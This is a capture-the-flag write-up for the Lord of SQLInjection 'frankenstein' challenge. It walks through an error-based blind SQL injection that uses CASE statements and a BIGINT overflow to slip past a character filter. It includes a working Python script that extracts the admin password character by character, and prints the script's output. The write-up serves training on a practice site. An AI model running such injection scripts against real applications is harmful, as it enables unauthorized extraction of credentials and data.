---
custom_edit_url: null
sidebar_position: 28
---

<figure style={{ textAlign: 'center' }}>
![1](https://github.com/Kunull/Write-ups/assets/110326359/6915fb41-8baa-45e1-98b3-c45d05e0ec03)
</figure>

We are provided with the SQL query:

```sql
SELECT id,pw FROM prob_frankenstein WHERE id='frankenstein' AND pw='{$_GET[pw]}'
```

## Filter:

This challenge filters the following: `_`, `.`, `(`, `)`, `union`.

Therefore we cannot use the  `length()` function and `if()` statements.
In order to get around this, we will have to use `CASE` statements.

## Error-based Blind SQL Injection

### ERROR 1690 (22003): BIGINT value is out of range[​](https://writeups-kunull.vercel.app/Lord%20of%20SQLInjection/iron_golem#error-1690-22003-bigint-value-is-out-of-range "Direct link to ERROR 1690 (22003): BIGINT value is out of range")

In SQL the maximum value for a column is `9223372036854775807`. If the value exceeds the limit, it throws the `ERROR 1690 (22003): BIGINT value is out of range` error message.

This is the error we will be exploiting.
### Wildcard

We also need to use the (`%`) wildcard character. It represents zero or more characters after teh specified character.

```
1% = 10, 100, 1200, etc
```

If we provide the following URI parameter:

```
?id=' || CASE WHEN id='admin' AND pw LIKE '[password_substring]%' THEN 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF ELSE 0 END -- -
```

The resultant query becomes:

```sql
SELECT id,pw FROM prob_frankenstein WHERE id='' || CASE WHEN id='admin' AND pw LIKE '[password_substring]%' THEN 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF ELSE 0 END -- -' AND pw='{$_GET[pw]}'
```

If the `[password_substring]` that we provide for `id='admin'` matches part of the `pw`, the `0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF` operation will be performed. Since the result of the multiplication operation would be greater than `9223372036854775807`, the challenge would throw an error if the condition is met.

### Script

```python title="frankenstein_script.md"
import requests
import urllib.parse
import string

cookies = {'PHPSESSID': 'fpl88d0ujgtatq5qt4a6o5n4om'}
url = 'https://los.rubiya.kr/chall/frankenstein_b5bab23e64777e1756174ad33f14b5db.php'

password = ''
end = False
searchspace = string.digits + string.ascii_letters

for index in range(1, 100):
  if (end == True):
    break
  end = True

  for char in searchspace:
    payload = f"' || CASE WHEN id='admin' AND pw LIKE '{password}{char}%' THEN 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF ELSE 0 END -- -"
    encoded_payload = urllib.parse.quote_plus(payload)
    full_url = f'{url}?pw={encoded_payload}'

    response = requests.get(full_url, cookies=cookies)

    if ("login_chk" in response.text):
      continue
    elif ("error" in response.text):
      print()
      print(f"[+] Payload: ?order={payload}")
      print(f"[+] Payload (URL encoded): ?order={encoded_payload}")
      print(f'[+] Character at index {index}: {char}')
      password = password + char
      end = False
      break

print()
print(f'[!] Extracted password: {password}')
print(f'[!] Final payload: ?pw={password}')
```

```
$ python .\frankenstein_script.py

[+] Payload: ?order=' || CASE WHEN id='admin' AND pw LIKE '0%' THEN 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF ELSE 0 END -- -
[+] Payload (URL encoded): ?order=%27+%7C%7C+CASE+WHEN+id%3D%27admin%27+AND+pw+LIKE+%270%25%27+THEN+0xFFFFFFFFFFFFFF%2A0xFFFFFFFFFFFFFF+ELSE+0+END+--+-
[+] Character at index 1: 0

[+] Payload: ?order=' || CASE WHEN id='admin' AND pw LIKE '0d%' THEN 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF ELSE 0 END -- -
[+] Payload (URL encoded): ?order=%27+%7C%7C+CASE+WHEN+id%3D%27admin%27+AND+pw+LIKE+%270d%25%27+THEN+0xFFFFFFFFFFFFFF%2A0xFFFFFFFFFFFFFF+ELSE+0+END+--+-
[+] Character at index 2: d

[+] Payload: ?order=' || CASE WHEN id='admin' AND pw LIKE '0dc%' THEN 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF ELSE 0 END -- -
[+] Payload (URL encoded): ?order=%27+%7C%7C+CASE+WHEN+id%3D%27admin%27+AND+pw+LIKE+%270dc%25%27+THEN+0xFFFFFFFFFFFFFF%2A0xFFFFFFFFFFFFFF+ELSE+0+END+--+-
[+] Character at index 3: c

[+] Payload: ?order=' || CASE WHEN id='admin' AND pw LIKE '0dc4%' THEN 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF ELSE 0 END -- -
[+] Payload (URL encoded): ?order=%27+%7C%7C+CASE+WHEN+id%3D%27admin%27+AND+pw+LIKE+%270dc4%25%27+THEN+0xFFFFFFFFFFFFFF%2A0xFFFFFFFFFFFFFF+ELSE+0+END+--+-
[+] Character at index 4: 4

[+] Payload: ?order=' || CASE WHEN id='admin' AND pw LIKE '0dc4e%' THEN 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF ELSE 0 END -- -
[+] Payload (URL encoded): ?order=%27+%7C%7C+CASE+WHEN+id%3D%27admin%27+AND+pw+LIKE+%270dc4e%25%27+THEN+0xFFFFFFFFFFFFFF%2A0xFFFFFFFFFFFFFF+ELSE+0+END+--+-     
[+] Character at index 5: e

[+] Payload: ?order=' || CASE WHEN id='admin' AND pw LIKE '0dc4ef%' THEN 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF ELSE 0 END -- -
[+] Payload (URL encoded): ?order=%27+%7C%7C+CASE+WHEN+id%3D%27admin%27+AND+pw+LIKE+%270dc4ef%25%27+THEN+0xFFFFFFFFFFFFFF%2A0xFFFFFFFFFFFFFF+ELSE+0+END+--+-    
[+] Character at index 6: f

[+] Payload: ?order=' || CASE WHEN id='admin' AND pw LIKE '0dc4efb%' THEN 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF ELSE 0 END -- -
[+] Payload (URL encoded): ?order=%27+%7C%7C+CASE+WHEN+id%3D%27admin%27+AND+pw+LIKE+%270dc4efb%25%27+THEN+0xFFFFFFFFFFFFFF%2A0xFFFFFFFFFFFFFF+ELSE+0+END+--+-   
[+] Character at index 7: b

[+] Payload: ?order=' || CASE WHEN id='admin' AND pw LIKE '0dc4efbb%' THEN 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF ELSE 0 END -- -
[+] Payload (URL encoded): ?order=%27+%7C%7C+CASE+WHEN+id%3D%27admin%27+AND+pw+LIKE+%270dc4efbb%25%27+THEN+0xFFFFFFFFFFFFFF%2A0xFFFFFFFFFFFFFF+ELSE+0+END+--+-  
[+] Character at index 8: b

[!] Extracted password: 0dc4efbb
[!] Final payload: ?pw=0dc4efbb
```

If we provide the following URI parameter:

```
?pw=0dc4efbb
```

The resultant query becomes:

```sql
SELECT id,pw FROM prob_frankenstein WHERE id='frankenstein' AND pw='0dc4efbb'
```

<figure style={{ textAlign: 'center' }}>
![2](https://github.com/Kunull/Write-ups/assets/110326359/bef1ff18-ace7-4eed-ab14-e9584686da12)
</figure>
